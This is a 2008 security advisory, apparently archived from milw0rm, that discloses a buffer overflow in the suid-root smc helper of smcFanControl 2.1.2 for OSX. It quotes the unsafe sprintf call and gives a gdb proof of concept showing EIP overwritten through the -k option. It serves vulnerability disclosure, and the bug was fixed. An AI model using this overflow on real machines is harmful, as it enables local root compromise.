@@ -1,0 +1,174 @@
+vnsecurity.net ADVISORY 2008-11
+===============================
+
+:Title: Buffer overflows in smcFanControl 2.1.2 for OSX
+:Severity: Critical
+:Reporter: KaiJern, Lau ( kjlau at vnsecurity.net)
+:Products: smcFanControl 2.1.2
+:OS: OSX
+:Fixed in: to be release smcFanControl 2.1.3
+
+
+About smcFanControl
+--------------------
+
+First of all, this is a very wonderul software and most of the macbook install
+with this software. A big credit for the author Hendrik Holtmann.
+
+Quote from the Official WebSite :
+
+smcFanControl lets the user set the minimum speed of the build in fans.
+So you can increase your minimum fan speed to make your intel mac run cooler.
+
+However in order not to damage your machine scFanControl let's you not
+set minimum
+speed to a rate under Apple's defaults. In addition to that fans are
+still in automatic
+mode, so the speed of your fans will increase, if CPU load gets higher.
+
+
+Description
+-----------
+
+First of all, let us look at
+/Applications/smcFanControl.app/Contents/Resources/smc
+
+Input option of smc -k was not able to handle large buffer. This will
+end up with a buffer overflow bug.
+
+Code from smc.c
+
+-- snip snip --
+
+int main(int argc, char *argv[])
+{
+    int c;
+    extern char   *optarg;
+    extern int    optind, optopt, opterr;
+
+    kern_return_t result;
+    int           op = OP_NONE;
+    UInt32Char_t  key = "\0";
+    SMCVal_t      val;
+
+    while ((c = getopt(argc, argv, "fhk:lrw:v")) != -1)
+    {
+        switch(c)
+        {
+        case 'f':
+            op = OP_READ_FAN;
+            break;
+        case 'k':
+            sprintf(key, optarg); // Overflow !!!
+            break;
+
+-- snip snip --
+
+$ ls -alF /Applications/smcFanControl.app/Contents/Resources/smc
+-r-sr-sr-x  1 root  admin  18212 Jun 13  2007
+/Applications/smcFanControl.app/Contents/Resources/smc*
+
+With default installation, smc binary is always install with suid
+root. There is a possibility
+for a local user to gain root privilege.
+
+It has not been verified if other version (version 1.x maybe) are also
+vulnerable.
+
+Workaround
+----------
+
+Upgrade to latest version.
+
+Fix
+---
+
+Hendrik Holtmann releasing smcFanControl 2.1.3.
+
+Disclosure
+----------
+
+vnsecurity.net adapts `RFPolicy v2.0
+<http://www.wiretrip.net/rfp/policy.html>`_ in notifying vendors.
+
+:Initial vendor contact:
+
+  Nov 10th, 2008: Initial contact sent to holtmann@mac.com, while we
+are having coffee.
+
+:Vendor response:
+
+  Nov 10th, 2008: Hendrik Holtmann response as soon as we finish our coffee.
+
+:Further communication:
+
+  Nov 10th, 2008: Technical summary sent to Hendrik Holtmann.
+  Nov 11th, 2008: Hendrik Holtmann responded with version upgrade. Fixed.
+
+
+
+:Public disclosure: 12th Nov 2008
+
+
+:PoC code:
+
+Exploit for the first overflow written by KaiJern, Lau
+
+::
+
+$ gdb -q /Applications/smcFanControl.app/Contents/Resources/smc
+Reading symbols for shared libraries ... done
+(gdb) r -k `ruby -e 'print "A" * 45'`BBBBCCCC
+Starting program:
+/Applications/smcFanControl.app/Contents/Resources/smc -k `ruby -e
+'print "A" * 45'`BBBBCCCC
+Reading symbols for shared libraries ++........ done
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x43434343
+0x43434343 in ?? ()
+(gdb) i r
+eax            0x0      0
+ecx            0xbfffeb8c       -1073747060
+edx            0x94bf94a6       -1799383898
+ebx            0x41414141       1094795585
+esp            0xbfffed60       0xbfffed60
+ebp            0x42424242       0x42424242
+esi            0x41414141       1094795585
+edi            0x41414141       1094795585
+eip            0x43434343       0x43434343
+eflags         0x10282  66178
+cs             0x17     23
+ss             0x1f     31
+ds             0x1f     31
+es             0x1f     31
+fs             0x0      0
+gs             0x37     55
+
+::
+
+Blog :
+------
+
+- http://blog.xwings.net
+
+
+Special Thanks to
+-----------------
+
+- Hack In The Box, http://www.hitb.org
+- beist.org
+- Blue Moon Consulting Co., Ltd, http://www.bluemoon.com.vn
+
+Disclaimer
+----------
+
+The information provided in this advisory is provided "as is" without
+warranty of any kind. vnsecurity.net disclaims all warranties,
+either express or implied, including the warranties of merchantability
+and fitness for a particular purpose.
+Your use of the information on the advisory or materials linked from
+the advisory is at your own risk.
+vnsecurity.net reserves the right to change or update this notice at any time.
+
+# milw0rm.com [2008-11-11]
